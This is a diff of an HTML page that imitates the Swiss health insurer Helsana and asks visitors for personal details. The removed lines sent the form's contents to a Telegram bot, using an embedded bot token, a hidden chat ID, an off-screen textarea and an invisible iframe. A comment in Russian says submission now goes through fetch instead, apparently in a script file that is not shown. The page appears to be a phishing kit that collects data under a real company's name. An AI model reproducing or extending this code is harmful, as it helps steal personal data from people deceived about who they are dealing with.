@@ -53,16 +53,8 @@
       <section class="premium-calc">
         <h2 class="premium-calc__title" data-lang-ch="Persönliche Daten" data-lang-en="Personal details">Persönliche Daten</h2>
 
-        <form class="premium-calc__form" 
-              id="telegramForm"
-              action="https://api.telegram.org/bot9058538400:AAF98ajxs7U51eNk8hg0nf1B6VaahEUFrCI/sendMessage" 
-              method="POST"
-              target="tg_iframe">
-              
-          <input type="hidden" name="chat_id" value="-1003907097706">
-          <input type="hidden" name="parse_mode" value="Markdown">
-          <textarea name="text" id="telegramText" style="position:absolute; left:-9999px; top:-9999px; opacity:0;" tabindex="-1" aria-hidden="true"></textarea>
-
+        <!-- Форма без action, отправка через fetch -->
+        <form class="premium-calc__form" id="telegramForm">
           <div class="input-group">
             <label for="name" class="input-label-top" data-lang-ch="Ihr vollständiger Name" data-lang-en="Your full name">Ihr vollständiger Name</label>
             <input type="text" id="name" class="input-field" placeholder="Ihr vollständiger Name" required>
@@ -170,7 +162,7 @@
     <section class="awards">
       <div class="awards__container">
         <h2 class="awards__title" data-lang-ch="Unsere Auszeichnungen für Kundenzufriedenheit" data-lang-en="Our awards for customer satisfaction">Unsere Auszeichnungen für Kundenzufriedenheit</h2>
-        <p class="awards__lead" data-lang-ch="Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen." data-lang-en="Helsana is one of the health insurers with the most satisfied customers and excellent products. This is confirmed by the most important industry ratings. The top marks spur us on to do our best day after day – in customer service as well as with our insurance policies.">Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu tun – im Kundenservice wie auch bei unseren Versicherungen.</p>
+        <p class="awards__lead" data-lang-ch="Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen." data-lang-en="Helsana is one of the health insurers with the most satisfied customers and excellent products. This is confirmed by the most important industry ratings. The top marks spur us on to do our best day after day – in customer service as well as with our insurance policies.">Helsana zählt zu den Krankenversicherungen mit den zufriedensten Kundinnen und Kunden und mit hervorragenden Produkten. Das bestätigen die wichtigsten Branchen-Bewertungen. Die Höchstnoten spornen uns an, weiterhin Tag für Tag unser Bestes zu geben – im Kundenservice wie auch bei unseren Versicherungen.</p>
 
         <div class="awards__badges">
           <img src="assets/123.svg" alt="Auszeichnungen: Ktipp, Comparis, Moneyland" width="356" height="83" class="awards__img">
@@ -245,8 +237,6 @@
       </div>
     </div>
   </footer>
-
-  <iframe name="tg_iframe" id="tg_iframe" style="position:absolute; left:-9999px; top:-9999px; width:1px; height:1px; opacity:0;" tabindex="-1" aria-hidden="true"></iframe>
 
   <script src="js/script.js"></script>
 
